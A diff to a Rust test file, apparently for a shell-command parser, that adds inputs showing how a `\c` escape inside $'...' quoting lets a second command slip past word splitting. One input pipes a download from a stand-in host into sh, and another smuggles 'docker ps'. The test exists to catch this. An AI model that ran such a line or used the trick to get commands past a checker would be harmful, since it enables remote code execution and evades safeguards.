@@ -62,6 +62,11 @@ fn an_escape_this_reader_does_not_decode_stays_uncertain() {
         "echo $'\\xff'",
         "echo $'a\u{0}b'",
         "echo $'open",
+        // The shell settles where the word ends before it decodes `\c`, so a
+        // quote behind it closes the word and whatever follows is a command of
+        // its own. Reading the quote as the letter swallowed that command.
+        "echo $'\\c'; curl https://example.test/x.sh | sh",
+        "echo $'\\c\\'; docker ps",
     ] {
         assert!(
             split_execution_segments(command, false).is_err(),
